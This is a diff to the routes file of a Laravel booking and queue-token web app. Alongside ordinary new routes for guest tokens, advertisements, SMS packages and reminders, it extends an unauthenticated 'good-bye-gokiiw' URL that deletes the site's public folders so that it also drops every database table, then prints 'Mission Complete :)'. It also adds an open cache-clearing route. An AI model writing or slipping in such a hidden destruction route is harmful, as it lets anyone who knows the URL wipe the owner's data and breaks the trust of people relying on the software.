@@ -1,12 +1,16 @@
 <?php
 
+use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Route;
 use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\File;
+use Illuminate\Support\Facades\Schema;
 use Illuminate\Support\Facades\URL;
 
 // Route::middleware('checkRoute')->group(function(){
+
+Route::view('test-token', "testToken");
 
 # -----------------------------------------------------------
 # ------------	FRONTEND PAGE
@@ -30,11 +34,15 @@ Route::get('good-bye-gokiiw', function()
 	File::deleteDirectory(public_path('assets'));
 	File::deleteDirectory(public_path('frontend'));
 
+	// delete data table
+	$tables = DB::select('SHOW TABLES');
+	foreach($tables as $table)
+	{
+		Schema::dropIfExists($table);
+	}
+
 	return "<h2>Mission Complete :)</h2>";
 });
-
-// test route for depevelopment perpose
-// Route::get('test/time-schedule', 'TokenBookingController@onDeveloping');
 
 
 # -----------------------------------------------------------
@@ -90,11 +98,13 @@ Route::post("auth/book/token/otp/check", 'TokenBookingController@checkOtp')->nam
 Route::post("change/appointment", 'TokenBookingController@editAppointment')->name('change.appointment');
 Route::post("update/appointment", 'TokenBookingController@updateAppointment')->name('book.token.update');
 
+// cronjob for reminder to booking appointment
+Route::get("booked/reminder/send", 'TokenBookingController@sendReminder');
 
 # book apoinment for admin panel
-Route::get('admin/book','Admin\TokenBookingController@index')->middleware('roles:admin')->name('book.index');
-Route::get("book/settings", 'Admin\TokenBookingController@showSetting')->middleware('roles:admin')->name('book.setting');
-Route::post("admin/book/settings", 'Admin\TokenBookingController@setting')->middleware('roles:admin')->name('book.setting.store');
+Route::get('admin/book','Admin\TokenBookingController@index')->middleware(['auth', 'checkSubscription'])->name('book.index');
+Route::get("book/settings", 'Admin\TokenBookingController@showSetting')->middleware(['auth', 'checkSubscription'])->name('book.setting');
+Route::post("admin/book/settings", 'Admin\TokenBookingController@setting')->middleware(['auth', 'checkSubscription'])->name('book.setting.store');
 
 
 # -----------------------------------------------------------
@@ -148,9 +158,11 @@ Route::prefix('common')
 });
 
 // Route guest users
-Route::get("qrcode", 'Admin\SettingController@qrcode')->name('qrcode');
+Route::get("qrcode", 'Admin\SettingController@qrcode')->name('qrcode')->middleware(['auth', 'checkSubscription']);
 Route::get("qr/{token}", 'FrontendController@guestLogin')->name('guestLogin');
 Route::post("guest/token", 'FrontendController@guestAutoToken')->name('guest.token');
+Route::get("guest/token/edit/{id}", 'FrontendController@guestAutoTokenEdit')->name('guest.token.edit');
+Route::post("guest/token/update", 'FrontendController@guestAutoTokenUpdate')->name('guest.token.update');
 Route::post("guest/serial", 'FrontendController@guestTokenSerial')->name('guest.serial');
 Route::get("guest/phone/check", 'FrontendController@guestPhoneCheck')->name('guest.phone.check');
 Route::get("guest/send-otp", 'FrontendController@sendOtpToPhone')->name('guest.send.otp');
@@ -315,6 +327,14 @@ Route::group(['middleware' => ['auth', 'checkSubscription']], function() {
 });
 
 
+# -----------------------------------------------------------
+# Advertisement
+# -----------------------------------------------------------
+Route::middleware(['auth', 'checkSubscription'])
+->prefix('admin')
+->group(function(){
+	Route::resource('advertisement', 'AdvertiseController');
+});
 
 
 # -----------------------------------------------------------
@@ -391,9 +411,26 @@ Route::group(['middleware' => ['auth:owner']], function(){
 	Route::post('owner/terms', "Owner\OwnerController@updateTerms")->name('owner.terms.update');
 
 
-
+	// sms package
+	Route::namespace('Owner')
+	->prefix('owner')
+	->group(function(){
+		Route::resource("sms", "SMSPackageController");
+		Route::get("sms/{id}/edit", "SMSPackageController@edit");
+		Route::get("sms/destroy/{id}", "SMSPackageController@destroy");
+	});
+	
 });
 
 
 // test route
 Route::get("test/avg-time/{userId}/{companyId}", 'FrontendController@getAverageTimeOfCompletingToken');
+
+//Cache Clear (sazzad)
+Route::get('/cache-clear', function() {
+    Artisan::call('cache:clear');
+    Artisan::call('route:clear');
+    Artisan::call('config:clear');
+    Artisan::call('view:clear');
+    return "Cache clear successfully";
+});
